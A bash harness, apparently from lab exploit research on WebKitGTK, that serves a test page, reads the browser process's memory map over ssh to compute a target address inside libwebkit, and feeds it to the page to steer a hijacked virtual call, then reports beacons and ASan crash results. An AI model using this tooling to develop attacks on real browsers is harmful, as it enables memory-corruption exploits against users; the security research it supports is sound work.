#!/usr/bin/env bash
# docs/104: dynamic-address vcall harness.  Launches the browser, reads the live WebProcess maps to resolve
# libwebkit's base, writes <base+offset> rounded down to 256 (the slot's low byte is forced to 0x00), lets the
# page fetch it, then reports the harness outcome.  No ASLR disable needed, and the address is genuinely the
# one in this run's address space.
#   usage: vrun.sh <tag> <port> <secs> <offset-hex> [query]
set -u
BOX=teo@<lab-ip>
TAG=${1:?}; PORT=${2:?}; SECS=${3:-30}; OFF=${4:?}; Q=${5:-}
# fill off is mandatory: an allocation after the clone re-fills the slot and every value crashes (docs/101)
AO="detect_leaks=0:detect_stack_use_after_return=0:abort_on_error=1:symbolize=1:handle_abort=1:quarantine_size_mb=0:thread_local_quarantine_size_kb=0:max_free_fill_size=0:max_malloc_fill_size=0"
ROOT=$(cd "$(dirname "$0")" && pwd)

ssh -o BatchMode=yes -o ConnectTimeout=8 "$BOX" "pkill -f '[h]ttp.server $PORT' ; true" >/dev/null 2>&1
sleep 0.2
ssh -o BatchMode=yes -o ConnectTimeout=8 "$BOX" "mkdir -p /tmp/wkp/live && rm -f /tmp/wkp/live/ptr.txt"
scp -q "$ROOT/vcall.html" "$BOX:/tmp/wkp/vcall.html"
ssh -o BatchMode=yes -o ConnectTimeout=8 "$BOX" \
  "cd /tmp/wkp && (setsid nohup python3 -m http.server $PORT > /tmp/srv$PORT.log 2>&1 &) ; sleep 1 ; curl -s -o /dev/null -w 'srv=%{http_code}\n' 'http://127.0.0.1:$PORT/vcall.html'"

# launch in the background so the maps can be read while the page waits
ssh -o BatchMode=yes "$BOX" \
  "distrobox enter wk --no-tty -- bash -lc \"env ASAN_OPTIONS=$AO bash ~/wk/run_nq.sh 'http://127.0.0.1:$PORT/vcall.html?$Q' $SECS\"" \
  > "/tmp/S_vc_$TAG.log" 2>&1 &
SSHPID=$!

PTR=""
for i in $(seq 1 40); do
  sleep 0.35
  PTR=$(ssh -o BatchMode=yes -o ConnectTimeout=6 "$BOX" '
    pid=$(pgrep -n -f WebKitWebProcess) || exit 0
    [ -n "$pid" ] || exit 0
    line=$(grep -m1 "libwebkit2gtk-4.1.so" /proc/$pid/maps 2>/dev/null) || exit 0
    base=$(echo "$line" | cut -d"-" -f1)
    [ -n "$base" ] || exit 0
    python3 -c "import sys; print(hex((int(sys.argv[1],16)+int(sys.argv[2],16)) & ~0xff))" "$base" "'"$OFF"'" 2>/dev/null' 2>/dev/null)
  [ -n "$PTR" ] && break
done

if [ -z "$PTR" ]; then echo "=== $TAG: no WebProcess/maps found"; else
  echo "=== $TAG port=$PORT off=$OFF target=$PTR"
  ssh -o BatchMode=yes "$BOX" "printf '%s\n' '$PTR' > /tmp/wkp/live/ptr.txt"
fi
wait $SSHPID 2>/dev/null

echo "--- beacons:"
ssh -o BatchMode=yes "$BOX" "grep -ao 'GET /ev?m=[^ ]*' /tmp/srv$PORT.log" 2>/dev/null \
  | sed 's|GET /ev?m=||' | python3 -c 'import sys, urllib.parse
for l in sys.stdin: print(urllib.parse.unquote(l.strip()))'
echo "--- outcome:"
if grep -aqE "ERROR: AddressSanitizer|WTFCrashWithInfo|CRASHED" "/tmp/S_vc_$TAG.log"; then
  grep -a -m1 -E "ERROR: AddressSanitizer|SUMMARY" "/tmp/S_vc_$TAG.log" | sed 's/^/  /'
  grep -a -m1 -A3 "ERROR: AddressSanitizer" "/tmp/S_vc_$TAG.log" | grep -E "^    #0|^    #1" | sed 's/^/  /'
else
  echo "  access: none"
fi
grep -a "^EXIT=" "/tmp/S_vc_$TAG.log" | tail -1
ssh -o BatchMode=yes "$BOX" "pkill -f '[h]ttp.server $PORT' ; true" >/dev/null 2>&1
